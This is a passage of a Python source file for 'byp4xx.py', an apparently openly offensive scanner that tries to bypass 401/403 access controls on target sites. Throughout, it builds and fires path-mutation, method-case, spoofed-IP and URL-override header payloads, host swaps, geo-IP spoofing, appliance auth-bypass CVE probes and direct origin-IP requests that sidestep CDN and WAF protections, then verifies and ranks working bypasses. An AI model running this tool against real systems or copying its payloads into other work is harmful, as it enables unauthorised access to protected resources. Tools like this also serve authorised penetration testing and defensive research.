                    return False
            elif status == rs and self._len_close(length, rl):
                return False
        # Catch-all shell: matches the random-path control -> the router
        # answers everything with the same shell; not a resource. Same
        # body-first / length-fallback rule as the homepage check above.
        if getattr(self, "ctrl_ref", None):
            cs, cl = self.ctrl_ref
            if sh and getattr(self, "ctrl_sh", None):
                if self._body_similar(sh, self.ctrl_sh):
                    return False
            elif cs is not None and status == cs and self._len_close(length, cl):
                return False
        # Redirect that just normalises back to the SAME protected path is a
        # bounce, not a bypass. Collapse /./ and /../ in the Location first so
        # '/./api/users/all' is recognised as == '/api/users/all'.
        if 300 <= status < 400 and loc:
            lpath = urlparse(loc).path or "/"
            norm = posixpath.normpath(lpath).rstrip("/") or "/"
            tgt = posixpath.normpath(self.target_path).rstrip("/") or "/"
            if norm == tgt:
                return False
        if 200 <= status < 400:
            # baseline already open -> only a real content change matters
            if bstat is not None and 200 <= bstat < 400:
                if sh and getattr(self, "base_sh", None):
                    return not self._body_similar(sh, self.base_sh)
                return not self._len_close(length, blen)
            # soft-block: 200 but the deny page again. If we have a body it
            # already passed the deny-similarity kill above, so only fall back
            # to length when there's no body fingerprint to judge content.
            if not sh and self.deny_len is not None and \
                    self._len_close(length, self.deny_len):
                return False
            return True
        # 4xx (other than deny) / 5xx are not access — treat as noise
        return False

    def _confidence(self, status, length, sh, text, repro, method, loc):
        """0.0-1.0 confidence that a verified hit is a REAL access-control
        bypass (not a soft-block / echo / flap). Independent positive signals
        add; deny/login/WAF markers subtract. Tuned so a clean deny->200 with
        a body distinct from every control and reproduced 3/3 lands >0.9, while
        anything resembling a block or login page is dragged well below."""
        bstat = self.baseline[0] if self.baseline else None
        score = 0.0
        # (1) status transition out of the deny state — the core signal
        if bstat in self.deny_codes and status not in self.deny_codes:
            score += 0.34
        if 200 <= status < 300:
            score += 0.10
        elif 300 <= status < 400:
            score += 0.04          # redirect to a non-deny location, weaker
        # (2) body is genuinely DIFFERENT from each control we captured
        if sh:
            if getattr(self, "deny_sh", None):
                score += 0.20 * (1.0 - _jaccard(sh, self.deny_sh))
            else:
                score += 0.12       # no deny body to compare (e.g. bare 403)
            if getattr(self, "root_sh", None) and self.target_path != "/":
                score += 0.10 * (1.0 - _jaccard(sh, self.root_sh))
            if getattr(self, "ctrl_sh", None):
                score += 0.10 * (1.0 - _jaccard(sh, self.ctrl_sh))
        else:
            score += 0.08           # no body (e.g. HEAD) — can't content-prove
        # (3) reproducibility across the verify samples (repro in [0,1])
        score += 0.16 * repro
        # (4) penalties: the body looks like a block / WAF / login wall
        if _has_sig(text, WAF_SIGNATURES):
            score -= 0.55
        if _has_sig(text, LOGIN_SIGNATURES):
            score -= 0.20
        # redirect whose Location leaves the host (off-site bounce) is weak
        if 300 <= status < 400 and loc:
            try:
                lnet = urlparse(loc).netloc
                if lnet and lnet != urlparse(self.root).netloc:
                    score -= 0.15
            except ValueError:
                pass
        return max(0.0, min(1.0, score))

    def _override_inert(self, method, url, headers, st, ln):
        """Three-way junk control for URL/prefix-override hits.

        A header-override 'hit' is only real if the SAME header pointing at a
        guaranteed-nonexistent path gives a DIFFERENT response. If the junk
        path yields the same (status,len) as the real path, the server is
        ignoring the header (serving root/app-shell regardless) -> inert, drop.
        """
        junk = "/byp4xx-" + "".join(
            random.choice("abcdefghijklmnop0123456789") for _ in range(16)
        ) + "/zz"
        jhdr, changed = {}, False
        for k, v in (headers or {}).items():
            if k in URL_OVERRIDE_HEADERS or k in PREFIX_HEADERS:
                jhdr[k] = junk
                changed = True
            else:
                jhdr[k] = v
        if not changed:
            return False
        js, jl, _ = self._request(url, method, jhdr)
        # inert == junk-path override looks identical to the real-path "hit"
        return js == st and self._len_close(jl, ln)

    # -- payload builders ---------------------------------------------------
    def _build_path_jobs(self, parsed):
        """Yield (label, url, method, headers) for path-based mutations."""
        path = parsed.path or "/"
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))

        # suffix mutations on full path
        for sfx in PATH_SUFFIXES:
            np = path.rstrip("/") + sfx if sfx.startswith("/") or not sfx \
                else path + sfx
            if not sfx:
                np = path
            yield ("PATH-SUFFIX", base + np, "GET", None)

        # prefix mutations
        for pfx in PATH_PREFIXES:
            np = pfx + path.lstrip("/")
            yield ("PATH-PREFIX", base + np, "GET", None)

        # last-segment wrappers
        segs = path.rstrip("/").split("/")
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for w in SEGMENT_WRAPPERS:
                seg = w.replace("{S}", last)
                np = (head + "/" + seg) if head else ("/" + seg)
                yield ("SEGMENT", base + np, "GET", None)

        # case toggle of last segment
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for variant in (last.upper(), last.capitalize(),
                            "".join(c.upper() if i % 2 else c
                                    for i, c in enumerate(last))):
                if variant != last:
                    np = (head + "/" + variant) if head else ("/" + variant)
                    yield ("CASE", base + np, "GET", None)

        # matrix / path-param injection before last segment
        if len(segs) > 1 and segs[-1]:
            last = segs[-1]
            head = "/".join(segs[:-1])
            for mp in MATRIX_PARAMS:
                np = f"{head}/{mp}{last}" if head else f"/{mp}{last}"
                yield ("MATRIX", base + np, "GET", None)
                np2 = f"{head}/{last}{mp}" if head else f"/{last}{mp}"
                yield ("MATRIX", base + np2, "GET", None)

        # whole-path case variants — case-insensitive backends/route tables
        # (e.g. /api/Users/All) sometimes skip a case-sensitive deny rule
        for variant in (path.upper(), path.lower(),
                        "/".join(s.capitalize() for s in path.split("/"))):
            if variant != path and variant != "/":
                yield ("CASE-FULL", base + variant, "GET", None)

        # append a fake extension to the whole path (static-file ACL skip)
        for ext in (".json", ".html", ".js", ".css", "?", "/?"):
            yield ("EXT", base + path.rstrip("/") + ext, "GET", None)

    def _build_method_jobs(self, url):
        for m in HTTP_METHODS:
            yield ("METHOD", url, m, None)
        # case-variant verbs — some ACLs match "GET" literal only
        for m in ("get", "Get", "pOsT", "GeT"):
            yield ("METHOD-CASE", url, m, None)

    def _build_header_jobs(self, url):
        parsed = urlparse(url)
        path = parsed.path or "/"
        root = urlunparse((parsed.scheme, parsed.netloc, "/", "", "", ""))

        # IP / origin spoof headers x spoofed IPs. HTTP header values must be
        # latin-1; fullwidth/ideographic IP forms only make sense in a path, so
        # filter them here instead of firing requests that can only raise.
        hdr_ips = [ip for ip in SPOOF_IPS if _latin1_ok(ip)]
        for hname in IP_HEADERS:
            for ip in hdr_ips:
                yield ("IP-HEADER", url, "GET", {hname: ip})

        # URL-override headers point at the protected path
        for hname in URL_OVERRIDE_HEADERS:
            yield ("URL-OVERRIDE", root, "GET", {hname: path})
            yield ("URL-OVERRIDE", url, "GET", {hname: path})
        # send root with empty path override (IIS quirk)
        yield ("URL-OVERRIDE", root, "GET", {"X-Original-URL": path,
                                             "X-Rewrite-URL": path})

        # Spring / reverse-proxy prefix-strip bypass (actuator-style).
        # Request a benign root, push real path via prefix header, and
        # also try the matrix-param actuator trick /;/<seg>.
        segs = [s for s in path.split("/") if s]
        if segs:
            last = segs[-1]
            head = "/" + "/".join(segs[:-1]) if len(segs) > 1 else ""
            for hname in PREFIX_HEADERS:
                yield ("PREFIX-HDR", root, "GET", {hname: path.rstrip("/")})
            # /;/admin  and  /admin/;/  style
            yield ("MATRIX-INJECT",
                   urlunparse((parsed.scheme, parsed.netloc,
                               f"{head}/;/{last}", "", "", "")),
                   "GET", None)

        # Method-override headers (framework re-dispatch)
        for hname in METHOD_OVERRIDE_HEADERS:
            for v in ("GET", "POST", "PUT", "TRACE", "OPTIONS"):
                yield ("METHOD-OVERRIDE", url, "POST", {hname: v})

        # Host header swap (vhost / internal routing)
        for hv in HOST_VALUES:
            yield ("HOST-SWAP", url, "GET", {"Host": hv})
        # trailing-dot host (FQDN root) — skips some host-based deny rules
        yield ("HOST-DOT", url, "GET", {"Host": parsed.netloc + "."})

        # IP-header SHOTGUN: set every trust header to 127.0.0.1 in ONE
        # request, so whichever header the backend actually reads wins. Most
        # writeup bypasses come from the proxy trusting an unexpected header.
        # Exclude malformed-token names (e.g. "X-...;/") — a single bad name
        # can make the origin 400 the whole combined probe; they still fire as
        # individual IP-HEADER jobs above.
        shotgun_hdrs = [h for h in IP_HEADERS if _token_name_ok(h)]
        shotgun_ips = list(dict.fromkeys((self.args.internal_ip or []) + SHOTGUN_IPS))
        for ip in shotgun_ips:
            yield ("IP-SHOTGUN", url, "GET", {h: ip for h in shotgun_hdrs})

        # PATH-trick x internal-IP combo: a path mutation reaches the route
        # while the spoofed internal IP satisfies an "internal-only" ACL.
        # This pairing (not either alone) is the real-world 403->200 winner.
        combo_paths = ["/..;/", "/%2e/", "/;/", "/.//", "//", "/%2f",
                       "/..%2f", "\\", "/%252f"]
        combo_ips = list(dict.fromkeys((self.args.internal_ip or []) + COMBO_IPS))
        cseg = path.rstrip("/").rsplit("/", 1)
        chead = cseg[0] if len(cseg) > 1 else ""
        clast = cseg[-1]
        for cp in combo_paths:
            np = f"{chead}{cp}{clast}" if clast else (chead + cp)
            cu = urlunparse((parsed.scheme, parsed.netloc, np, "", "", ""))
            for cip in combo_ips:
                yield ("PATH+IP", cu, "GET", {"X-Forwarded-For": cip,
                                              "X-Real-IP": cip})

        # scheme / port override headers
        for v in SCHEME_VALUES:
            yield ("SCHEME", url, "GET", {"X-Forwarded-Scheme": v})
            yield ("SCHEME", url, "GET", {"X-Forwarded-Proto": v})
        for pv in PORT_VALUES:
            yield ("PORT", url, "GET", {"X-Forwarded-Port": pv})
        yield ("SSL", url, "GET", {"X-Forwarded-Ssl": "on"})

        # User-Agent bypass (crawler / internal allowlists) — explicit + labeled
        for ua in USER_AGENTS:
            yield ("USER-AGENT", url, "GET", {"User-Agent": ua})

        # auth-context header set (empty/default creds, XHR, type override)
        for hname, hval in AUTH_HEADERS:
            yield ("AUTH", url, "GET", {hname: hval})

        # NOVEL / modern bypass headers (Next.js CVE-2025-29927, Akamai debug,
        # Early-Data 0-RTT, X-Accel internal redirect, Spring prefix collapse).
        # The unique edge over the four merged tools.
        for hname, hval in NOVEL_HEADERS:
            yield ("NOVEL-HDR", url, "GET", {hname: hval})

        # referer/origin self-trust + version + cache tricks
        yield ("REFERER", url, "GET", {"Referer": url})
        yield ("REFERER", url, "GET", {"Referer": root})
        yield ("ORIGIN", url, "GET", {"Origin": root.rstrip("/")})
        yield ("CONTENT-LEN", url, "POST", {"Content-Length": "0"})
        yield ("ACCEPT-VER", url, "GET", {"Accept-Version": "1"})
        yield ("PRAGMA", url, "GET", {"Pragma": "no-cache",
                                      "Cache-Control": "no-transform"})

    def _build_geo_jobs(self, url):
        """One request per in-country IP, all geo-trust headers set to it —
        find a single IP that clears the geo/edge ACL. A second job sends the
        RFC 7239 `Forwarded: for=<ip>` form, which proxies parse differently
        from the bare-IP X-Forwarded-* headers."""
        for ip in getattr(self.args, "geo_ips", None) or []:
            yield ("GEO-SPOOF", url, "GET", {h: ip for h in GEO_HEADERS})
            fwd = f"for=\"[{ip}]\"" if ":" in ip else f"for={ip}"
            yield ("GEO-RFC7239", url, "GET", {"Forwarded": fwd})

    def _build_cve_jobs(self, url):
        """Documented appliance/WAF-gateway auth-bypass CVE probes (header sets
        + fixed traversal paths), each CVE-labeled. Detection GETs only."""
        if getattr(self.args, "no_cve", False):
            return
        for label, hdrs in CVE_HEADER_JOBS:
            yield (label, url, "GET", dict(hdrs))
        parsed = urlparse(url)
        root = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        for label, path in CVE_PATH_JOBS:
            yield (label, root + path, "GET", None)

    def _build_origin_jobs(self, url):
        """Hit each candidate origin IP directly, carrying the target Host
        header, to reach the resource behind a CDN/WAF (edge bypass). Works for
        any CDN (Cloudflare/Akamai/Sucuri/Imperva) — it sidesteps the edge, not
        a header CVE. Requires TLS verification off (cert won't match the IP)."""
        origins = getattr(self.args, "origin_ips", None) or []
        if not origins:
            return
        parsed = urlparse(url)
        for ip in origins:
            netloc = f"[{ip}]" if ":" in ip and not ip.startswith("[") else ip
            ou = urlunparse((parsed.scheme, netloc, parsed.path or "/",
                             parsed.params, parsed.query, ""))
            yield ("ORIGIN-DIRECT", ou, "GET", {"Host": parsed.netloc})

    def build_jobs(self, url):
        parsed = urlparse(url)
        raw = (list(self._build_method_jobs(url))
               + list(self._build_path_jobs(parsed))
               + list(self._build_header_jobs(url))
               + list(self._build_geo_jobs(url))
               + list(self._build_cve_jobs(url))
               + list(self._build_origin_jobs(url)))
        # dedupe identical (method, url, headers) tuples — the suffix/prefix
        # sets overlap heavily ("" + "/" etc.) and waste requests otherwise
        seen, jobs = set(), []
        for label, u, method, headers in raw:
            key = (method, u, tuple(sorted((headers or {}).items())))
            if key in seen:
                continue
            seen.add(key)
            jobs.append((label, u, method, headers))
        return jobs

    # -- run ----------------------------------------------------------------
    def _run_job(self, job):
        label, url, method, headers = job
        st, ln, r = self._request(url, method, headers)
        loc = ""
        sh, text = frozenset(), ""
        if hasattr(r, "headers"):
            loc = r.headers.get("Location", "")
            sh, text = self._fp(r)
        detail = ""
        if headers:
            detail = " ".join(f"{k}: {v}" for k, v in headers.items())
        elif method != "GET":
            detail = method
        return (label, method, url, detail, st, ln, loc, headers, sh, text)

    def scan(self, url):
        print(f"\n{C.BOLD}{C.B}[*] Target: {url}{C.END}")
        self.set_baseline(url)
        jobs = self.build_jobs(url)
        print(f"{C.GR}[*] {len(jobs)} payloads queued, "
              f"{self.args.threads} threads{C.END}")
        if len(jobs) > 6000 and not self.args.delay:
            print(f"{C.Y}[!] {len(jobs)} requests with no --delay may trip "
                  f"rate-limits / CDN bans. Consider --delay 0.2 -t 10.{C.END}")
        print()

        hits = []
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.args.threads) as ex:
            futs = [ex.submit(self._run_job, j) for j in jobs]
            for fut in concurrent.futures.as_completed(futs):
                (label, method, u, detail, st, ln,
                 loc, hdrs, sh, text) = fut.result()
                interesting = self._interesting(st, ln, u, method, loc, sh)
                if interesting:
                    # keep real headers/method + first-pass body for verify
                    hits.append((label, method, u, detail, st, ln,
                                 loc, hdrs, sh, text))
                self._print_line(label, method, u, detail, st, ln, interesting)

        # VERIFY + SCORE: re-request every candidate N times (quorum) and keep
        # only the reproducible ones, then attach a confidence score. Kills
        # jitter/transient FPs (dynamic length, one-off 5xx, rate-limit flap),
        # inert override headers, and soft-blocks that slipped the first pass.
        scored = []
        n = max(1, self.args.verify_samples)
        for (label, method, u, detail, st, ln,
             loc, hdrs, sh, text) in hits:
            if self.args.no_verify:
                conf = self._confidence(st, ln, sh, text, 1.0, method, loc)
                scored.append((label, method, u, detail, st, ln, conf))
                continue
            agree = 0
            last = None
            for _ in range(n):
                st2, ln2, r2 = self._request(u, method, hdrs)
                loc2 = r2.headers.get("Location", "") \
                    if hasattr(r2, "headers") else ""
                sh2, text2 = self._fp(r2) if hasattr(r2, "headers") \
                    else (frozenset(), "")
                ok = (self._interesting(st2, ln2, u, method, loc2, sh2)
                      and st2 == st and self._len_close(ln2, ln))
                if ok:
                    agree += 1
                    last = (st2, ln2, sh2, text2, loc2)
            repro = agree / n
            if agree == 0:
                print(f"{C.GR}[verify] dropped flaky {label} {method} "
                      f"{u} ({st}/{ln}b not reproducible){C.END}")
                continue
            # junk-control: header-override hits must differ from the same
            # header pointed at a nonexistent path, else the header is inert
            if label in ("URL-OVERRIDE", "PREFIX-HDR", "NOVEL-HDR") and \
                    self._override_inert(method, u, hdrs, st, ln):
                print(f"{C.GR}[verify] dropped inert {label} {method} "
                      f"{u} — same response with junk-path override{C.END}")
                continue
            st3, ln3, sh3, text3, loc3 = last if last else (st, ln, sh, text, loc)
            conf = self._confidence(st3, ln3, sh3, text3, repro, method, loc3)
            if conf < self.args.min_confidence:
                print(f"{C.GR}[verify] dropped low-confidence "
                      f"{int(conf*100)}% {label} {method} {u}{C.END}")
                continue
            scored.append((label, method, u, detail, st, ln, conf))

        dropped = len(hits) - len(scored)
        if dropped:
            print(f"{C.GR}[verify] {dropped} candidate(s) removed "
                  f"(flaky / inert / low-confidence){C.END}")
        hits = scored
        self._summary(url, hits)
        return hits

    def _print_line(self, label, method, url, detail, st, ln, interesting):
        if st is None:
            if self.args.verbose:
                print(f"{C.GR}[ERR ] {label:<12} {method:<8} {detail}{C.END}")
            return
        if self.args.only_hits and not interesting:
            return
        if 200 <= st < 300:
            col = C.G
        elif 300 <= st < 400:
            col = C.B
        elif st in (401, 403):
            col = C.GR
        else:
            col = C.Y
        mark = f"{C.M}<== BYPASS{C.END}" if interesting else ""
        line = (f"{col}[{st}] {ln:>7}b  {label:<12} {method:<8} "
                f"{detail[:60]:<60}{C.END} {mark}")
        print(line)

    def _summary(self, url, hits):
        if not hits:
            print(f"\n{C.Y}[-] No bypass found for {url}{C.END}")
        else:
            print(f"\n{C.G}{C.BOLD}[+] {len(hits)} verified "
                  f"bypass(es) for {url} (confidence-ranked):{C.END}")
            # highest confidence first
            for label, method, u, detail, st, ln, conf in sorted(
                    hits, key=lambda x: x[6], reverse=True):
                pct = int(conf * 100)
                tier = C.G if conf >= 0.9 else (C.Y if conf >= 0.75 else C.GR)
                print(f"  {tier}[{pct:>3}%]{C.END} {C.G}[{st}] {ln}b{C.END} "
                      f"{label} {method} {detail}  -> {u}")
        if not self.baseline_stable:
            print(f"{C.Y}[!] baseline was unstable — hits above may be flaps, "
                  f"verify manually{C.END}")
        # collect for file output (text + structured)
        for label, method, u, detail, st, ln, conf in hits:
            self.results.append(
                f"[{int(conf*100)}%] [{st}] {ln}b\t{label}\t{method}\t"
                f"{detail}\t{u}")
            self.json_results.append({
                "target": url, "confidence": round(conf, 3),
                "status": st, "length": ln, "technique": label,
                "method": method, "detail": detail, "url": u,
                "baseline_stable": self.baseline_stable,
            })


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(
        description="byp4xx.py — unified 40x bypass scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "requires: python3 + requests (pip install requests). No IP DB "
            "needed for normal use.\n"
            "geo mode (optional): download the iplocate ip-to-country DB once, "
            "pass it with --geo-db.\n"
            "  git clone https://github.com/iplocate/ip-address-databases\n"
            "examples:\n"
            "  python3 byp4xx.py -u https://t.com/admin -t 10 --delay 0.2 -k\n"
            "  python3 byp4xx.py -d site.tn --geo-db ip-to-country.csv.zip -k"
        ),
    )
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url", help="single target URL")
    g.add_argument("-d", "--domain", help="single target domain (scheme "
                   "optional); with --geo-db, auto-spoofs IPs of the domain's "
                   "ccTLD country (.tn->TN, .fr->FR)")
    g.add_argument("-l", "--list", help="file with one URL per line")
    p.add_argument("-t", "--threads", type=int, default=20,
                   help="concurrent threads (default 20)")
    p.add_argument("--timeout", type=float, default=10,
                   help="request timeout seconds (default 10)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="per-request delay seconds (jittered) — avoids IP bans")
    p.add_argument("--retries", type=int, default=2,
                   help="retries on HTTP 429 with backoff (default 2)")
    p.add_argument("--deny-codes", default="401,403",
                   help="status codes treated as 'denied' baseline (default 401,403)")
    p.add_argument("--ua", help="fixed User-Agent for all baseline requests")
    p.add_argument("-x", "--proxy", help="proxy e.g. http://127.0.0.1:8080")
    p.add_argument("-k", "--insecure", action="store_true",
                   help="skip TLS verification")
    p.add_argument("-H", "--header", action="append",
                   help="extra header 'Name: Value' (repeatable)")
    p.add_argument("--internal-ip", action="append", metavar="IP",
                   help="internal/allowlisted IP to spoof across all trust "
                        "headers + shotgun + PATH+IP combo (repeatable) — feed "
                        "an internal host found in recon")
    p.add_argument("--geo-db", metavar="PATH",
                   help="iplocate ip-to-country DB (CSV or .csv.zip) to source "
                        "real in-country IPs for geo-ACL bypass")
    p.add_argument("--geo-country", metavar="CC",
                   help="ISO country code(s), comma-separated, to spoof from "
                        "--geo-db (e.g. TN or US,FR). Requires --geo-db")
    p.add_argument("--geo-limit", type=int, default=100,
                   help="max in-country IPs to sample per country (default 100)")
    p.add_argument("--no-cve", action="store_true",
                   help="skip appliance/WAF auth-bypass CVE probes "
                        "(FortiOS/F5/Citrix/Ivanti)")
    p.add_argument("--origin-ip", action="append", metavar="IP",
                   help="candidate origin IP behind a CDN/WAF — byp4xx hits it "
                        "directly with the target Host header to bypass the "
                        "edge entirely (repeatable; feed from cloud-recon)")
    p.add_argument("--origin-list", metavar="FILE",
                   help="file of candidate origin IPs, one per line")
    p.add_argument("-o", "--output", help="write hits to file")
    p.add_argument("--json", dest="json_out",
                   help="write hits as JSON to this file")
    p.add_argument("--only-hits", action="store_true",
                   help="print only successful bypasses")
    p.add_argument("--no-verify", action="store_true",
                   help="skip the re-request verification pass on hits")
    p.add_argument("--verify-samples", type=int, default=3,
                   help="re-request count per candidate in verify (default 3); "
                        "a hit must reproduce at least once and is scored on "
                        "how many of N samples agree")
    p.add_argument("--min-confidence", type=float, default=0.80,
                   help="drop verified hits below this confidence 0-1 "
                        "(default 0.80; use 0.9 for <10%% FP, 0 to keep all)")
    p.add_argument("--sim-threshold", type=float, default=0.85,
                   help="Jaccard body-similarity at/above which two responses "
                        "are treated as the same page (default 0.85)")
    p.add_argument("--payloads-dir", default="~/.byp4xx",
                   help="dir with url_payloads.txt / ip_payloads.txt / "
                        "ip_headers.txt to merge into the built-in corpus "
                        "(default ~/.byp4xx; auto-bundled lists live there)")
    p.add_argument("--no-external", action="store_true",
                   help="ignore --payloads-dir; use only built-in payloads")
    p.add_argument("-v", "--verbose", action="store_true",
                   help="show errors too")
    p.add_argument("--no-color", action="store_true", help="disable color")
    return p.parse_args()


def main():
    args = parse_args()
    if args.no_color or not sys.stdout.isatty():
        C.strip()
    try:
        args.deny_codes = {int(x) for x in args.deny_codes.split(",") if x.strip()}
    except ValueError:
        print(f"{C.R}[!] --deny-codes must be comma-separated integers{C.END}")
        sys.exit(1)
    print(C.M + BANNER + C.END)

    if args.internal_ip:
        global SPOOF_IPS
        SPOOF_IPS = list(dict.fromkeys(args.internal_ip + SPOOF_IPS))
        print(f"{C.GR}[*] spoofing {len(args.internal_ip)} user internal IP(s) "
              f"across all trust headers: {', '.join(args.internal_ip)}{C.END}")

    args.geo_ips = []

    if not args.no_external:
        stats = load_external_payloads(args.payloads_dir)
        if stats:
            summary = ", ".join(f"{v} {k}" for k, v in stats.items())
            print(f"{C.GR}[*] merged external corpus from "
                  f"{args.payloads_dir} ({summary}){C.END}")

    targets = []
    if args.url:
        targets = [args.url.strip()]
    elif args.domain:
        targets = [args.domain.strip()]
    else:
        try:
            with open(args.list) as f:
                targets = [ln.strip() for ln in f if ln.strip()
                           and not ln.startswith("#")]
        except OSError as e:
            print(f"{C.R}[!] Cannot read list: {e}{C.END}")
            sys.exit(1)

    if args.geo_db:
        if args.geo_country:
            countries = [c for c in args.geo_country.split(",") if c.strip()]
        else:
            countries = sorted({cc for t in targets
                                if (cc := country_from_host(_host_of(t)))})
        if countries:
            try:
                args.geo_ips = load_geo_ips(args.geo_db, countries, args.geo_limit)
            except (OSError, zipfile.BadZipFile) as e:
                print(f"{C.R}[!] cannot read --geo-db: {e}{C.END}")
                sys.exit(1)
            print(f"{C.GR}[*] geo: {len(args.geo_ips)} IP(s) for "
                  f"{','.join(countries)} from {args.geo_db}{C.END}")
            if not args.geo_ips:
                print(f"{C.Y}[!] no IPs matched — check country code / DB "
                      f"format{C.END}")
        else:
            print(f"{C.Y}[!] no ccTLD country inferred from target(s); pass "
                  f"--geo-country{C.END}")
    elif args.geo_country:
        print(f"{C.R}[!] --geo-country requires --geo-db (iplocate "
              f"ip-to-country CSV/zip){C.END}")
        sys.exit(1)

    args.origin_ips = list(args.origin_ip or [])
    if args.origin_list:
        try:
            with open(args.origin_list) as f:
                args.origin_ips += [ln.strip() for ln in f
                                    if ln.strip() and not ln.startswith("#")]
        except OSError as e:
            print(f"{C.R}[!] cannot read --origin-list: {e}{C.END}")
            sys.exit(1)
    args.origin_ips = list(dict.fromkeys(args.origin_ips))
    if args.origin_ips:
        if not args.insecure:
            args.insecure = True
            print(f"{C.GR}[*] origin mode: TLS verification disabled "
                  f"(cert won't match IP){C.END}")
        print(f"{C.GR}[*] {len(args.origin_ips)} origin IP(s) to probe "
              f"direct (edge bypass){C.END}")

    scanner = Byp4xx(args)
    start = time.time()
    all_hits = []
    for url in targets:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        all_hits += scanner.scan(url)

    print(f"\n{C.GR}[*] Done in {time.time()-start:.1f}s — "
          f"{len(all_hits)} total bypass(es){C.END}")

    if args.output and scanner.results:
        with open(args.output, "w") as f:
            f.write("\n".join(scanner.results) + "\n")
        print(f"{C.G}[+] Saved to {args.output}{C.END}")

    if args.json_out and scanner.json_results:
        with open(args.json_out, "w") as f:
            json.dump(scanner.json_results, f, indent=2)
        print(f"{C.G}[+] Saved JSON to {args.json_out}{C.END}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.END}")
        sys.exit(130)
